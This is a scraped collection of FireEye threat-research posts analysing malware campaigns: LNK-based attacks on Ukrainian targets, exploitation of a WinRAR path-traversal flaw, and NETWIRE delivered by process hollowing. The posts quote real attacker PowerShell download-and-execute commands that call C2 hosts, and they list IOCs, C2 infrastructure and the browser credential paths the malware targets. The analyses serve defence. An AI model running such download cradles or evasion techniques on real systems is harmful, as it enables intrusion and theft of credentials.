command (Figure 5) was received after decoding the Base64-encoded string: vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -e iex(iwr -useb http://sinoptik[.]website/EuczSc)\"\", 0 : window.close\") Figure 5: LNK file command The PowerShell script sends a request to URL \"http://sinoptik[.]website/EuczSc.\" Unfortunately, the server was unreachable during analysis. Network Infrastructure Linked to Attackers The passive DNS records of the C&C domain \"sinoptik[.]website\" included the following IPs: Host/Domain Name First Seen IP sinoptik[.]website 2018-09-17 78.140.167.89 sinoptik[.]website 2018-06-08 78.140.164.221 sinoptik[.]website 2018-03-16 185.125.46.158 www.sinoptik[.]website 2019-01-17 78.140.167.89 Table 2: Network infrastructure linked to attackers Domains previously connected to RATVERMIN (aka VERMIN) and QUASARRAT (aka QUASAR) also resolved to IP \"185.125.46.158\" and include the following: Malware MD5 C&C Malware Family 47161360b84388d1c254eb68ad3d6dfa akamainet022[.]info QUASARRAT 242f0ab53ac5d194af091296517ec10a notifymail[.]ru RATVERMIN 07633a79d28bb8b4ef8a6283b881be0e akamainet066[.]info QUASARRAT 5feae6cb9915c6378c4bb68740557d0a akamainet024[.]info RATVERMIN dc0ab74129a4be18d823b71a54b0cab0 akamaicdn[.]ru QUASARRAT bbcce9c91489eef00b48841015bb36c1 cdnakamai[.]ru QUASARRAT Table 3: Additional malware linked to the attackers RATVERMIN is a .NET backdoor that FireEye Threat Intelligence started tracking in March 2018. It has also been reported in public reports and blog posts . Operators Highly Aggressive, Proactive The actor is highly interactive with its tools and has responded within a couple of hours of receiving a new victim, demonstrating its ability to react quickly. An example of this hands-on style of operation occurred during live malware analysis. RATVERMIN operators observed that the malware was running from an unintended target at approximately 1700 GMT (12:00 PM Eastern Standard Time on a weekday) and promptly executed the publicly available Hidden Tear ransomware (saved to disk as hell0.exe, MD5: 8ff9bf73e23ce2c31e65874b34c54eac). The ransomware process was killed before it could execute successfully. If the Hidden Tear continued execution, a file would have been left on the desktop with the following message: \"Files have been encrypted with hidden tear. Send me some bitcoins or kebab. And I also hate night clubs, desserts, being drunk.\" When live analysis resumed, the threat group behind the attack started deleting all the analysis tools on the machine. Upon resetting the machine and executing the malware again, this time with a text file open asking why they sent ransomware, the threat group responded by sending the following message via RATVERMIN's C&C domain (Figure 6): C&C to Victim HTTP/1.1 200 OK Content-Length: 5203 Content-Type: multipart/related; type=\"application/xop+xml\";start=\"<http://tempuri[.]org/0>\";boundary=\"uuid:67761605- 5c90-47ac-bcd8- 718a09548d60+id=14\";start-info=\"application/soap+xml\" Server: Microsoft-HTTPAPI/2.0 MIME-Version: 1.0 Date: Tue, 20 Mar 2018 19:01:26 GMT --uuid:67761605-5c90-47ac-bcd8-718a09548d60+id=14 Content-ID: <http://tempuri[.]org/0> Content-Transfer-Encoding: 8bit Content-Type: application/xop+xml;charset=utf-8;type=\"application/soap+xml\" <TRUNCATED> Mad ? Figure 6: RATVERMIN's C&C domain message Related Samples Further research uncovered additional LNK files with PowerShell scripts that connect to the same C&C server. Filename: Висновки. S021000262_1901141812000. Scancopy_0003. HP LaserJet Enterprise 700 M775dn(CC522A).docx.lnk (Ukrainian translation: Conclusion) MD5: fe198e90813c5ee1cfd95edce5241e25 Description: LNK file also has the substituted Microsoft Word document icon and sends a request to the same C&C domain C&C: http://sinoptik[.]website/OxslV6 PowerShell activity (Command Line Arguments): vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell.exe -c iex(iwr -useb http://sinoptik[.]website/OxslV6)\"\", 0 : window.close\") Figure 7: Additional LNK files with PowerShell scripts Filename: КМУ база даних.zip (Ukrainian translation: Cabinet of Ministers of Ukraine database) MD5: a5300dc3e19f0f0b919de5cda4aeb71c Description: ZIP archive containing a malicious LNK file Filename: Додаток.pdf (Ukrainian translation: Addition) MD5: a40fb835a54925aea12ffaa0d76f4ca7 Description: Benign decoy document Filename: КМУ_база_даних_органи_упр,_СГ_КМУ.rtf.lnk MD5: 4b8aac0649c3a846c24f93dc670bb1ef Description: Malicious LNK that executes a PowerShell script C&C: http://cdn1186[.]site/zG4roJ powershell.exe -NoP -NonI -W hidden -Com \"$cx=New-Object -ComObject MsXml2.ServerXmlHttp;$cx.Open('GET','http://cdn1186[.]site/zG4roJ',$False);$cx.Send(); $cx.ResponseText|.( ''.Remove.ToString()[14,50,27]-Join'')\" !%SystemRoot%\\system32\\shell32.dll Figure 8: Additional LNK files with PowerShell scripts FireEye Detection FireEye detection names for the indicators in the attack include the following: FireEye Endpoint Security INVOKE CRADLECRAFTER (UTILITY) MALICIOUS SCRIPT CONTENT A (METHODOLOGY) MSHTA.EXE SUSPICIOUS COMMAND LINE SCRIPTING (METHODOLOGY) OFFICE CLIENT SUSPICIOUS CHILD PROCESS (METHODOLOGY) PERSISTENT MSHTA.EXE PROCESS EXECUTION (METHODOLOGY) POWERSHELL.EXE EXECUTION ARGUMENT OBFUSCATION (METHODOLOGY) POWERSHELL.EXE IEX ENCODED COMMAND (METHODOLOGY) SUSPICIOUS POWERSHELL USAGE (METHODOLOGY) FireEye Network Security 86300142_Backdoor.Win.QUASARRAT 86300140_Backdoor.Win.QUASARRAT 86300141_Backdoor.Win.QUASARRAT Malware.archive FE_Backdoor_MSIL_RATVERMIN_1 33340392_Backdoor.Win.RATVERMIN 33340391_Backdoor.Win.RATVERMIN FireEye Email Security FE_MSIL_Crypter FE_Backdoor_MSIL_RATVERMIN_1 Malware.Binary.lnk Malware.Binary.exe Malware.archive Backdoor.Win.QUASARRAT Backdoor.Win.RATVERMIN CustomPolicy.MVX.exe CustomPolicy.MVX.65003.ExecutableDeliveredByEmail Summary of Indicators Malicious package and LNK files 982565e80981ce13c48e0147fb271fe5 e92d01d9b1a783a23477e182914b2454 ec0fb9d17ec77ad05f9a69879327e2f9 fe198e90813c5ee1cfd95edce5241e25 a5300dc3e19f0f0b919de5cda4aeb71c 4b8aac0649c3a846c24f93dc670bb1ef Related File 0d6a46eb0d0148aafb34e287fcafa68f (decoy document) bace12f3be3d825c6339247f4bd73115 (decoy document) a40fb835a54925aea12ffaa0d76f4ca7 (decoy document) Quasar RAT Samples 50b1f0391995a0ce5c2d937e880b93ee 47161360b84388d1c254eb68ad3d6dfa 07633a79d28bb8b4ef8a6283b881be0e dc0ab74129a4be18d823b71a54b0cab0 bbcce9c91489eef00b48841015bb36c1 3ddc543facdc43dc5b1bdfa110fcffa3 5b5060ebb405140f87a1bb65e06c9e29 80b3d1c12fb6aaedc59ce4323b0850fe d2c6e6b0fbe37685ddb865cf6b523d8c dc0ab74129a4be18d823b71a54b0cab0 dca799ab332b1d6b599d909e17d2574c RATVERMIN 242f0ab53ac5d194af091296517ec10a 5feae6cb9915c6378c4bb68740557d0a 5e974179f8ef661a64d8351e6df53104 0b85887358fb335ad0dd7ccbc2d64bb4 9f88187d774cc9eaf89dc65479c4302d 632d08020499a6b5ee4852ecadc79f2e 47cfac75d2158bf513bcd1ed5e3dd58c 8d8a84790c774adf4c677d2238999eb5 860b8735995df9e2de2126d3b8978dbf 987826a19f7789912015bb2e9297f38b a012aa7f0863afbb7947b47bbaba642e a6ecfb897ca270dd3516992386349123 7e2f581f61b9c7c71518fea601d3eeb3 b5a6aef6286dd4222c74257d2f44c4a5 0f34508772ac35b9ca8120173c14d5f0 (RATVERMIN's keylogger) 86d2493a14376fbc007a55295ef93500 (RATVERMIN's encryption tool) 04f1aa35525a44dcaf51d8790d1ca8a0 (RATVERMIN helper functions) 634d2a8181d08d5233ca696bb5a9070d (RATVERMIN helper functions) d20ec4fdfc7bbf5356b0646e855eb250 (RATVERMIN helper functions) 5ba785aeb20218ec89175f8aaf2e5809 (RATVERMIN helper functions) b2cf610ba67edabb62ef956b5e177d3a (RATVERMIN helper functions) 7e30836458eaad48bf57dc1decc27d09 (RATVERMIN helper functions) df3e16f200eceeade184d6310a24c3f4 (RATVERMIN crypt functions) 86d2493a14376fbc007a55295ef93500 (RATVERMIN crypt functions) d72448fd432f945bbccc39633757f254 (RATVERMIN task scheduler tool) e8e954e4b01e93f10cefd57fce76de25 (RATVERMIN task scheduler tool) Hidden Tear Ransomware 8ff9bf73e23ce2c31e65874b34c54eac Malicious Infrastructure akamainet022[.]info akamainet066[.]info akamainet024[.]info akamainet023[.]info akamainet066[.]info akamainet021[.]info www.akamainet066[.]info www.akamainet023[.]info www.akamainet022[.]info www.akamainet021[.]info akamaicdn[.]ru cdnakamai[.]ru mailukr[.]net notifymail[.]ru www.notifymail[.]ru tech-adobe.dyndns[.]biz sinoptik[.]website cdn1186[.]site news24ua[.]info http://sinoptik[.]website/EuczSc http://sinoptik[.]website/OxslV6 http://cdn1186[.]site/zG4roJ 206.54.179.196 195.78.105.23 185.125.46.24 185.158.153.222 188.227.16.73 212.116.121.46 185.125.46.158 94.158.46.251 188.227.75.189 Correlated Infrastructure 78.140.167.89 (pdns) 1ua[.]eu (pdns) 24ua[.]website (pdns, registered by re2a1er1@yandex.ru) cdn1214[.]site (pdns) censor[.]website (pdns, registered by re2a1er1@yandex.ru) fakty[.]website (pdns, registered by re2a1er1@yandex.ru) gismeteo[.]website (pdns, registered by re2a1er1@yandex.ru) lmeta[.]eu (pdns) me.co[.]ua (pdns, registered by re2a1er1@yandex.ru) milnews[.]info (pdns) mj2[.]pw (pdns, registered by re2a1er1@yandex.ru) novaposhta[.]website (pdns, registered by re2a1er1@yandex.ru) olx[.]website (pdns, registered by re2a1er1@yandex.ru) www.olx[.]website (pdns, registered by re2a1er1@yandex.ru) onlineua[.]website (pdns, registered by re2a1er1@yandex.ru) r2a[.]pw (pdns, registered by re2a1er1@yandex.ru) rarnbier[.]ru (pdns) rbc[.]website (pdns) rst[.]website (pdns, registered by re2a1er1@yandex.ru) satv[.]pw (pdns, registered by re2a1er1@yandex.ru) slaviasoft[.]website (pdns, registered by re2a1er1@yandex.ru) tv.co[.]ua (pdns, registered by re2a1er1@yandex.ru) uatoday[.]website (pdns, registered by re2a1er1@yandex.ru) ukrnews[.]website (pdns, registered by re2a1er1@yandex.ru) www.ukrnews[.]website (pdns, registered by re2a1er1@yandex.ru) ukrposhta[.]website (pdns, registered by re2a1er1@yandex.ru) unian[.]pw (pdns) vj2[.]pw (pdns, registered by re2a1er1@yandex.ru) windowsupdate.kiev[.]ua (pdns) xn--90adzbis.xn--c1avg (registered by re2a1er1@yandex.ru) z1k[.]pw (pdns, registered by re2a1er1@yandex.ru) 188.164.251.61 (pdns) 188.227.17.68 (pdns) 206.54.179.160 (pdns of many malicious domains) 208.69.116.100 (pdns) 208.69.116.144 (pdns) 5.200.53.181 (pdns) 78.140.162.22 (pdns) 78.140.167.137 (pdns) 88.85.86.229 (pdns) 88.85.95.72 (pdns) 94.158.34.2 (pdns) 94.158.47.228 (pdns) Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2019/03/winrar-zero-day-abused-in-multiple-campaigns.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2019-03-26",
                    "source": "www.fireeye.com"
                },
                "text": "WinRAR, an over 20-year-old file archival utility used by over 500 million users worldwide, recently acknowledged a long-standing vulnerability in its code-base. A recently published path traversal zero-day vulnerability, disclosed in CVE-2018-20250 by Check Point Research , enables attackers to specify arbitrary destinations during file extraction of ‘ACE’ formatted files, regardless of user input. Attackers can easily achieve persistence and code execution by creating malicious archives that extract files to sensitive locations, like the Windows “Startup” Start Menu folder. While this vulnerability has been fixed in the latest version of WinRAR (5.70), WinRAR itself does not contain auto-update features, increasing the likelihood that many existing users remain running out-of-date versions. FireEye has observed multiple campaigns leveraging this vulnerability, in addition to those already discussed by 360 Threat Intelligence Center . Below we will look into some campaigns we came across that used customized and interesting decoy documents with a variety of payloads including ones which we have not seen before and the ones that used off-the-shelf tools like PowerShell Empire. Campaign 1: Impersonating an Educational Accreditation Council Infection Vector When the ACE file Scan_Letter_of_Approval.rar is extracted with vulnerable WinRAR versions lower than 5.70, it creates a file named winSrvHost.vbs in the Windows Startup folder without the user’s consent. The VBScript file is executed the next time Windows starts up. Decoy Document To avoid user suspicion, the ACE file contains a decoy document, “Letter of Approval.pdf”, which purports to be from CSWE, the Council on Social Work Education as shown in Figure 1. This seems to be copied from CSWE website. Figure 1: Decoy document impersonating CSWE VBS Backdoor The VBS file in the Startup folder will be executed by wscript.exe when Windows starts up. The VBS code first derives an ID for the victim using custom logic based on a combination of the ComputerName, Processor_identifier and Username. It obtains these from environment strings, as shown in Figure 2. Figure 2: Deriving victim ID Interestingly, the backdoor communicates with the command and control (C2) server using the value of the Authorization HTTP header using the code in Figure 3. Figure 3: Base64-encoded data in Authorization header The VBS backdoor first sends the base64-encoded data, including the victim ID and the ComputerName, using the code in Figure 4. Figure 4: Base64-encoded victim data It then extracts the base64-encoded data in the Authorization header of the HTTP response from the C2 server and decodes it. The decoded data starts with the instruction code from the C2 server, followed with additional parameters. C2 Communication The malware reaches out to the C2 server at 185[.]162.131.92 via an HTTP request. Actual communication is via the Authorization field, as shown in Figure 5. Figure 5: Communication via Authorization field Upon decoding the value of the Authorization field, it can be seen that the malware is sending the Victim ID and the computer name to the C2 server. The C2 server responds with the commands in the value of the Authorization HTTP header, as shown in Figure 6. Figure 6: C2 commands in Authorization field Upon decoding, the commands are found to be “ok ok”, which we believe is the default C2 command. After some C2 communication, the C2 server responded with instructions to download the payload from hxxp://185.49.71[.]101/i/pwi_crs.exe, which is a Netwire RAT. Commands Supported by VBS Backdoor Command Explanation d Delete the VBS file and exit process Pr Download a file from a URL and execute it Hw Get hardware info av Look for antivirus installed from a predefined list. Indicators File Name Hash/IP Address Scan_Letter_of_Approval.rar 8e067e4cda99299b0bf2481cc1fd8e12 winSrvHost.vbs 3aabc9767d02c75ef44df6305bc6a41f Letter of Approval.pdf dc63d5affde0db95128dac52f9d19578 pwi_crs.exe 12def981952667740eb06ee91168e643 C2 185[.]162.131.92 Netwire C2 89[.]34.111.113 Campaign 2: Attack on Israeli Military Industry Infection Vector Based on the email uploaded to VirusTotal, the attacker seems to send a spoofed email to the victim with an ACE file named SysAid-Documentation.rar as an attachment. Based on the VirusTotal uploader and the email headers, we believe this is an attack on an Israeli military company. Decoy Files The ACE file contains decoy files related to documentation for SysAid, a help desk service based in Israel. These files are shown as they would be displayed in WinRAR in Figure 7. Figure 7: Decoy files Thumbs.db.lnk This LNK file target is ‘C:\\Users\\john\\Desktop\\100m.bat’. But when we look at the icon location using a LNK parser, as shown in Figure 8, it points to an icon remotely hosted on one of the C2 servers, which can be used to steal NTLM hashes. Figure 8: LNK parser output SappyCache Analysis Upon extraction, WinRAR copies a previously unknown payload we call SappyCache to the Startup folder with the file name ‘ekrnview.exe’. The payload is executed the next time Windows starts up. SappyCache tries to fetch the next-stage payload using three approaches: 1) Decrypting a File: The malware tries to read the file at %temp%\\..\\GuiCache.db. If it is successful, it tries to decrypt it using RC4 to get the C2 URLs, as shown in Figure 9. Figure 9: Decrypting file at GuiCache.db 2) Decrypting a Resource: If it is not successful in retrieving the C2 URL using the previous method, the malware tries to retrieve the encrypted C2 URLs from a resource section, as shown in Figure 10. If it is successful, it will decrypt the C2 URLs using RC4. Figure 10: Decrypting a resource 3) Retrieving From C2: If it is not successful in retrieving the C2 URLs using those previous two methods, the malware tries to retrieve the payload from four different hardcoded URLs mentioned in the indicators. The malware creates the HTTP request using the following information: Computer Name, retrieved using the GetComputerNameA function, as the HTTP parameter ‘name’ (Figure 11). Figure 11: Retrieving computer name using GetComputerNameA Windows operating system name, retrieved by querying the ProductName value from the registry key SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion, as the HTTP parameter ‘key’ (Figure 12). Figure 12: Retrieving Windows OS name using ProductName value The module name of the malware, retrieved using the GetModuleFileNameA function, as the HTTP parameter ‘page’ (Figure 13). Figure 13: Retrieving malware module name using using GetModuleFileNameA The list of processes and their module names, retrieved using the Process32First and Module32First APIs, as the HTTP parameter ‘session_data’ (Figure 14). Figure 14: Retrieving processes and modules using Process32First and Module32First A fragment of the HTTP request that is built with the information gathered is shown in Figure 15. Figure 15: HTTP request fragment If any of the aforementioned methods is successful, the malware tries to execute the decrypted payload. During our analysis, the C2 server did not respond with a next-level payload. Indicators File Name/Type Hash/URL SysAid-Documentation.rar 062801f6fdbda4dd67b77834c62e82a4 SysAid-Documentation.rar 49419d84076b13e96540fdd911f1c2f0 ekrnview.exe 96986B18A8470F4020EA78DF0B3DB7D4 Thumbs.db.lnk 31718d7b9b3261688688bdc4e026db99 URL1 www.alahbabgroup[.]com/bakala/verify.php URL2 103.225.168[.]159/admin/verify.php URL3 www.khuyay[.]org/odin_backup/public/loggoff.php URL4 47.91.56[.]21/verify.php Email 8c93e024fc194f520e4e72e761c0942d Campaign 3: Potential Attack in Ukraine with Empire Backdoor Infection Vector The ACE file named zakon.rar is propagated using a malicious URL mentioned in the indicators. 360 Threat Intelligence Center has also encountered this campaign. Decoy Documents The ACE file contains a file named Ukraine.pdf, which contains a message on the law of Ukraine about public-private partnerships that purports to be a message from Viktor Yanukovych, former president of Ukraine (Figure 16 and Figure 17). Figure 16: Ukraine.pdf decoy file Figure 17: Contents of decoy file Based on the decoy PDF name, the decoy PDF content and the VirusTotal uploader, we believe this is an attack on an individual in Ukraine. Empire Backdoor When the file contents are extracted, WinRAR drops a .bat file named mssconf.bat in the Startup folder. The batch file contains commands that invoke base64-encoded PowerShell commands. After decoding, the PowerShell commands invoked are found to be the Empire backdoor, as shown in Figure 18. We did not observe any additional payloads at the time of analysis. Figure 18: Empire backdoor Indicators File Name/URL Hash/URL zakon.rar 9b19753369b6ed1187159b95fc8a81cd mssconf.bat 79B53B4555C1FB39BA3C7B8CE9A4287E C2 31.148.220[.]53 URL http://tiny-share[.]com/direct/7dae2d144dae4447a152bef586520ef8 Campaign 4: Credential and Credit Card Dumps as Decoys Decoy Documents This campaign uses credential dumps and likely stolen credit card dumps as decoy documents to distribute different types of RATs and password stealers. One file, ‘leaks copy.rar’, used text files that contained stolen email IDs and passwords as decoys. These files are shown as they would be displayed in WinRAR in Figure 19. Figure 19: Text files containing stolen email credentials as decoy Another file, ‘cc.rar’, used a text file containing stolen credit card details as a decoy. The file as it would be displayed in WinRAR and sample contents of the decoy file are shown in Figure 20. Figure 20: Text file containing stolen credit card details as decoy Payloads This campaign used payloads from different malware families. To keep the draft concise, we did not include the analysis of all of them. The decompilation of one of the payloads with hash 1BA398B0A14328B9604EEB5EBF139B40 shows keylogging capabilities (Figure 21). We later identified this sample as QuasarRAT. Figure 21: Keylogging capabilities The decompilation of all the .NET-based payload shows that much of the code is written in Chinese. The decompilation of malware with hash BCC49643833A4D8545ED4145FB6FDFD2 containing Chinese text is shown in Figure 22. We later identified this sample as Buzy. Figure 22: Code written in Chinese The other payloads also have similar keylogging, password stealing and standard RAT capabilities. The VirusTotal submissions show the use of different malware families in this campaign and a wide range of targeting. Hashes of ACE Files File Name Hash leaks copy.rar e9815dfb90776ab449539a2be7c16de5 cc.rar 9b81b3174c9b699f594d725cf89ffaa4 zabugor.rar 914ac7ecf2557d5836f26a151c1b9b62 zabugorV.rar eca09fe8dcbc9d1c097277f2b3ef1081 Combolist.rar 1f5fa51ac9517d70f136e187d45f69de Nulled2019.rar f36404fb24a640b40e2d43c72c18e66b IT.rar 0f56b04a4e9a0df94c7f89c1bccf830c Hashes of Payloads File name Hash Malware Family explorer.exe 1BA398B0A14328B9604EEB5EBF139B40 QuasarRAT explorer.exe AAC00312A961E81C4AF4664C49B4A2B2 Azorult IntelAudio.exe 2961C52F04B7FDF7CCF6C01AC259D767 Netwire Discord.exe 97D74671D0489071BAA21F38F456EB74 Razy Discord.exe BCC49643833A4D8545ED4145FB6FDFD2 Buzy old.exe 119A0FD733BC1A013B0D4399112B8626 Azorult FireEye Detection FireEye detection names for the indicators in the attack: FireEye Endpoint Security IOC: WINRAR (EXPLOIT) MG: Generic.mg AV: Exploit.ACE-PathTraversal.Gen Exploit.Agent.UZ Exploit.Agent.VA Gen:Heur.BZC.ONG.Boxter.91.1305E319 Gen:Variant.Buzy.2604 Gen:Variant.Razy.472302 Generic.MSIL.PasswordStealerA.5CBD94BB Trojan.Agent.DPAS Trojan.GenericKD.31783690 Trojan.GenericKD.31804183 FireEye Network Security FE_Exploit_ACE_CVE201820250_2 FE_Exploit_ACE_CVE201820250_1 Backdoor.EMPIRE Downloader.EMPIRE Trojan.Win.Azorult Trojan.Netwire FireEye Email Security FE_Exploit_ACE_CVE201820250_2 FE_Exploit_ACE_CVE201820250_1 FE_Backdoor_QUASARRAT_A FE_Backdoor_EMPIRE Conclusion We have seen how various threat actors are abusing the recently disclosed WinRAR vulnerability using customized decoys and payloads, and by using different propagation techniques such as email and URL. Because of the huge WinRAR customer-base, lack of auto-update feature and the ease of exploitation of this vulnerability, we believe this will be used by more threat actors in the upcoming days. Traditional AV solutions will have a hard time providing proactive zero-day detection for unknown malware families. FireEye MalwareGuard , a component of FireEye Endpoint Security, detects and blocks all the PE executables mentioned in this blog post using machine learning. It’s also worth noting that this vulnerability allows the malicious ACE file to write a payload to any path if WinRAR has sufficient permissions, so although the exploits that we have seen so far chose to write the payload to startup folder, a more involved threat actor can come up with a different file path to achieve code execution so that any behavior based rules looking for WinRAR writing to the startup folder can be bypassed. Enterprises should consider blocking vulnerable WinRAR versions and mandate updating WinRAR to the latest version. FireEye Endpoint Security, FireEye Network Security and FireEye Email Security detect and block these campaigns at several stages of the attack chain. Acknowledgement Special thanks to Jacob Thompson, Jonathan Leathery and John Miller for their valuable feedback on this blog post. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2019/03/dissecting-netwire-phishing-campaign-usage-of-process-hollowing.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2019-03-15",
                    "source": "www.fireeye.com"
                },
                "text": "Introduction Malware authors attempt to evade detection by executing their payload without having to write the executable file on the disk. One of the most commonly seen techniques of this \"fileless\" execution is code injection. Rather than executing the malware directly, attackers inject the malware code into the memory of another process that is already running. Due to its presence on all Windows 7 and later machines and the sheer number of supported features, PowerShell has been a favorite tool of attackers for some time. FireEye has published multiple reports where PowerShell was used during initial malware delivery or during post-exploitation activities. Attackers have abused PowerShell to easily interact with other Windows components to perform their activities with stealth and speed. This blog post explores a recent phishing campaign observed in February 2019, where an attacker targeted multiple customers and successfully executed their payload without having to write the executable dropper or the payload to the disk. The campaign involved the use of VBScript, PowerShell and the .NET framework to perform a code injection attack using a process hollowing technique. The attacker abused the functionality of loading .NET assembly directly into memory of PowerShell to execute malicious code without creating any PE files on the disk. Activity Summary The user is prompted to open a document stored on Google Drive. The name of the file, shown in Figure 1, suggests that the actor was targeting members of the airline industry that use a particular aircraft model. We have observed an increasing number of attackers relying on cloud-based file storage services that bypass firewall restrictions to host their payload. Figure 1: Malicious script hosted on Google Drive As seen in Figure 2, attempting to open the script raises an alert from Internet Explorer saying that the publisher could not be verified. In our experience, many users will choose to ignore the warning and open the document. Figure 2: Alert raised by Internet Explorer Upon execution, after multiple levels of obfuscation, a PowerShell script is executed that loads a .NET assembly from a remote URL, functions of which are then used to inject the final payload (NETWIRE Trojan) into a benign Microsoft executable using process hollowing. This can potentially bypass application whitelisting since all processes spawned during the attack are legitimate Microsoft executables. Technical Details The initial document contains VBScript code. When the user opens it, Wscript is spawned by iexplore to execute this file. The script uses multiple layers of obfuscation to bypass static scanners, and ultimately runs a PowerShell script for executing the binary payload. Obfuscation techniques used during different levels of script execution are shown in Figure 3 and Figure 4. Figure 3: Type 1 obfuscation technique, which uses log functions to resolve a wide character Figure 4: Type 2 obfuscation technique, which uses split and replace operations This script then downloads and executes another encoded .vbs script from a paste.ee URL, as seen in Figure 5. Paste.ee is a less regulated alternative to Pastebin and we have seen multiple attacks using this service to host the payload. Since the website uses TLS, most firewall solutions cannot detect the malicious content being downloaded over the network. Figure 5: Downloading the second-stage script and creating a scheduled task The script achieves persistence by copying itself to Appdata/Roaming and using schtasks.exe to create a scheduled task that runs the VBScript every 15 minutes. After further de-obfuscation of the downloaded second-stage VBScript, we obtain the PowerShell script that is executed through a shell object, as shown in Figure 6. Figure 6: De-obfuscated PowerShell script The PowerShell script downloads two Base64-encoded payloads from paste.ee that contain binary executable files. The strings are stored as PowerShell script variables and no files are created on disk. Microsoft has provided multiple ways of interacting with the .NET framework in PowerShell to enhance it through custom-developed features. These .NET integrations with PowerShell are particularly attractive to attackers due to the limited visibility that traditional security monitoring tools have around the runtime behaviors of .NET processes. For this reason, exploit frameworks such as CobaltStrike and Metasploit have options to generate their implants in .NET assembly code. Here, the attackers have used the Load method from the System.Reflection.Assembly .NET Framework class. After the assembly is loaded as an instance of System.Reflection.Assembly , the members can be accessed through that object similarly to C#, as shown in Figure 7. Figure 7: Formatted PowerShell code The code identifies the installed version of .NET and uses it later to dynamically resolve the path to the .NET installation folder. The decoded dropper assembly is passed as an argument to the Load method. The resulting class instance is stored as a variable. The objects of the dropper are accessed through this variable and method R is invoked. Method R of the .NET dropper is responsible for executing the final payload. The following are the parameters for method R: Path to InstallUtil.exe (or other .NET framework tools) Decoded NETWIRE trojan When we observed the list of processes spawned during the attack (Figure 8), we did not see the payload spawned as a separate process. Figure 8: Processes spawned during attack We observed that the InstallUtil.exe process was being created in suspended mode. Once it started execution, we compared its memory artifacts to a benign execution of InstallUtil.exe and concluded that the malicious payload is being injected into the memory of the newly spawned InstallUtil.exe process. We also observed that no arguments are passed to InstallUtil, which would cause an error under normal execution since InstallUtil always expects at least one argument. From a detection evasion perspective, the attacker has chosen an interesting approach. Even if the PowerShell process creation is detected, InstallUtil.exe is executed from its original path. Furthermore, InstallUtil.exe is a benign file often used by internal automations. To an unsuspecting system administrator, this might not seem malicious. When we disassembled the .NET code and removed the obfuscation to understand how code injection was performed, we were able to identify Windows win32 API calls associated with process hollowing (Figure 9). Figure 9: Windows APIs used in .NET dropper for process hollowing After reversing and modifying the code of the C# dropper to invoke R from main, we were able to confirm that when the method R is invoked, InstallUtil.exe is spawned in suspended mode. The memory blocks of the suspended process are unmapped and rewritten with the sections of the payload program passed as an argument to method R. The thread is allowed to continue after changes have been made to the entry point. When the process hollowing is complete, the parent PowerShell process is terminated. High-Level Analysis of the Payload The final payload was identified by FireEye Intelligence as a NETWIRE backdoor. The backdoor receives commands from a command and control (C2) server, performs reconnaissance that includes the collection of user data, and returns the information to the C2 server. Capabilities of the NETWIRE backdoor include key logging, reverse shell, and password theft. The backdoor uses a custom encryption algorithm to encrypt data and then writes it to a file created in the ./LOGS directory. The malware also contains a custom obfuscation algorithm to hide registry keys, APIs, DLL names, and other strings from static analysis. Figure 10 provides the decompiled version of the custom decoding algorithm used on these strings. Figure 10: Decompiled string decoding algorithm From reversing and analyzing the behavior of the malware, we were able to identify the following capabilities: Record mouse and keyboard events Capture session logon details Capture system details Take screenshots Monitor CPU usage Create fake HTTP proxy From the list of decoded strings, we were able to identify other features of this sample: “POP3” “IMAP” “SMTP” “HTTP” \"Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows Messaging Subsystem\\\\Profiles\\\\Outlook\\\\” \"Software\\\\Microsoft\\\\Office\\\\15.0\\\\Outlook\\\\Profiles\\\\Outlook\\\\” \"Software\\\\Microsoft\\\\Office\\\\16.0\\\\Outlook\\\\Profiles\\\\Outlook\\\\” Stealing data from an email client “\\Google\\Chrome\\User Data\\Default\\Login Data” “\\Chromium\\User Data\\Default\\Login Data” “\\Comodo\\Dragon\\User Data\\Default\\Login Data” “\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data” “\\Opera Software\\Opera Stable\\Login Data” “Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2” “vaultcli.dll: VaultOpenVault,VaultCloseVault,VaultEnumerateItem,VaultGetItem,VaultFree” “select *  from moz_login” Stealing login details from browsers A complete report on the NETWIRE backdoor family is available to customers who subscribe to the FireEye Intelligence portal . Indicators of Compromise Host-based indicators: dac4ed7c1c56de7d74eb238c566637aa Initial attack vector .vbs file Network-based indicators: 178.239.21.]62:1919 kingshakes[.]linkpc[.]net 105.112.35[.]72:3575 homi[.]myddns[.]rocks C2 domains of NETWIRE Trojan FireEye Detection FireEye detection names for the indicators in the attack: Endpoint security Exploit Guard: Blocks execution of wscript IOC: POWERSHELL DOWNLOADER D (METHODOLOGY) AV: Trojan.Agent.DRAI Network Security Backdoor.Androm Email Security Malicious.URL Malware.Binary.vbs Conclusion Malware authors continue to use different \"fileless\" process execution techniques to reduce the number of indicators on an endpoint. The lack of visibility into .NET process execution combined with the flexibility of PowerShell makes this technique all the more effective. FireEye Endpoint Security and the FireEye Network Security detect and block this attack at several stages of the attack chain. Acknowledgement We would like to thank Frederick House, Arvind Gowda, Nart Villeneuve and Nick Carr for their valuable feedback. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2019/03/breaking-the-bank-weakness-in-financial-ai-applications.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2019-03-13",
                    "source": "www.fireeye.com"
                },
